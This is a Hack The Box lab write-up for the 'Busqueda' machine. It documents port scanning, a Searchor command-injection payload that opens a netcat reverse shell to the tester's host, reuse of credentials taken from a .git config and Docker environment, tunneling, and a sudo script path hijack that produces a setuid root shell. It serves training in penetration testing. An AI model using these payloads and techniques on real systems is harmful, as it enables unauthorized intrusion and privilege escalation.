---
tags:
  - hack
  - linux
names:
  - busqueda
os: Linux
revisit: true
---
# HTB: [Busqueda](https://app.hackthebox.com/machines/Busqueda)

> [!tip]- Summary with Spoilers
> - This machine was running a vulnerable version of the [Searchor](https://github.com/ArjunSharda/Searchor) framework, which I exploited to achieve RCE as the `svc` user.
> - I used credentials stored in a `.git` configuration file to access an internal [Gitea](https://gitea.io/en-us/) instance, where I obtained a backup of a script run via `sudo`.
> - By hijacking the script's path, I executed arbitrary commands to escalate privileges.

## Services

### TCP

```console
$ sudo nmap -v -sCV -p- -T4 -oN tcp_full t
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 12:15 CST
...

Nmap scan report for t (10.10.11.208)
Host is up (0.097s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.
...
```

Re-running for 80/tcp since there was an unfollowed redirect:

```console
$ sudo nmap -v -sCV -p80 -T4  searcher.htb
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: Host: searcher.htb
```

#### 80/tcp Http

```console
$ whatweb http://t
http://t [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.208], RedirectLocation[http://searcher.htb/], Title[302 Found]
http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

Added `searcher.htb` to `/etc/hosts`.

The `query` parameter chokes on single-ticks:

```console
$ curl -X POST -d "engine=Bing" -d "query=a'+'b" http://searcher.htb/search
```

I thought this might work but it doesn't:

```console
$ curl -X POST -d "engine=Bing" -d "query=a'.upper()+'b" http://searcher.htb/search
# No result.
```

## RCE

The web application self-identifies that it's using [Searchor](https://github.com/ArjunSharda/Searchor), which has [a command-injection vulnerability](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection):

```console
$ curl -X POST -d "engine=Bing" -d "query=%27%29%2B+str%28__import__%28%27os%27%29.system%28%27busybox+nc+10.10.14.12+443+-e+bash%27%29%29%23" http://searcher.htb/search
```

```console
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
...

svc@busqueda:/var/www/app$ cat ~/user.txt
ce1786...
```

## PE

Using a previously discovered password in `/var/www/app/.git/config` I'm able to authenticate via password as the `svc` user and see some Sudo privileges:

```console
svc@busqueda:/var/www/app$ cat .git/config
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
[remote "origin"]
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
remote = origin
merge = refs/heads/main
svc@busqueda:/var/www/app$ su - root
Password:
su: Authentication failure
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_ptyUser svc may run the following commands on busqueda:
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

I'm able to run `docker-inspect` via the script in Sudo, which reveals two passwords:

```console
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
...

    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],
...
```

And I find some hashes via MariaDB:

```console
mysql> select name, salt, passwd, passwd_hash_algo from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+------------------+
| name          | salt                             | passwd                                                                                               | passwd_hash_algo |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+------------------+
| administrator | a378d3f64143b284f104c926b8b49dfb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 | pbkdf2           |
| cody          | d1db0a75a18e50de754be2aafcad5533 | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e | pbkdf2           |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+------------------+
2 rows in set (0.00 sec)
```

I spent some time trying to get these hashes in a PBKDF2 format that Hashcat can recognize, but eventually found a faster path.

The target has services listening on `localhost`:

```console
svc@busqueda:~$ netstat -lnpt4
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:37247         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1652/python3
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
```

First I setup Ligolo for easier access to the internal ports, so I don't need to do port forwarding for each separately.

```text
$ ligolo-proxy -selfcert -laddr 0.0.0.0:31337
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:31337          
```

On the target:

```console
svc@busqueda:~$ ./ligolo-agent -ignore-cert -connect 10.10.14.12:31337
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.14.12:31337"
```

Create the `tuntap` device and start the tunnel:

```console
$ sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up && ifconfig ligolo
[sudo] password for kali:
ligolo: flags=4241<UP,POINTOPOINT,NOARP,MULTICAST>  mtu 1500
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
RX packets 0  bytes 0 (0.0 B)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 0  bytes 0 (0.0 B)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...

ligolo-ng » session
? Specify a session : 1 - #1 - svc@busqueda - 10.10.11.208:34778
[Agent : svc@busqueda] » tunnel_start 
[Agent : svc@busqueda] » INFO[0119] Starting tunnel to svc@busqueda              
```

Now I have full access to the internal ports.

```console
$ sudo ip route add 240.0.0.1/32 dev ligolo
```

After scanning the ports I'm able to identify a Gitea instance running on port 3000. The credentials above for `cody` work, but that user only has access to the main Searcher application. I can also login as `administrator` using the the value for `MYSQL_PASSWORD` discovered above via `docker-inspect`.

From here I can view a repository called `scripts`. The script `/opt/scripts/system-checkup.py` is the one that the `svc` account is able to run via Sudo, which I can now inspect for a PE opportunity. The `full-checkup` mode of that script contains this:

```python
elif action == 'full-checkup':
try:
arg_list = ['./full-checkup.sh']
print(run_command(arg_list))
print('[+] Done!')
except:
print('Something went wrong')
exit(1)
```

The relative path used for `./full-checkup.sh` presents the needed opportunity to hijack the script:

```console
svc@busqueda:~$ vi full-checkup.sh
# Payload: cp /bin/bash /tmp/x; chown root:root /tmp/x; chmod 6777 /tmp/x
svc@busqueda:~$ chmod +x full-checkup.sh
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup[+] Done!
svc@busqueda:~$ ls -l
total 1424
-rwxr-xr-x 1 svc  svc       90 May 15 22:01 full-checkup.sh
-rw-r--r-- 1 svc  svc    48825 May 15 20:03 lp.out
drwx------ 3 svc  svc     4096 May 15 19:30 snap
-rw-r----- 1 root svc       33 May 15 18:14 user.txt
-rwsrwsrwx 1 root root 1396520 May 15 22:02 x
svc@busqueda:~$ ./x -p
x-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)
x-5.1# cat /root/root.txt
2756fb...
```

## Credits

Thanks [0xdf](https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html) for the hints.
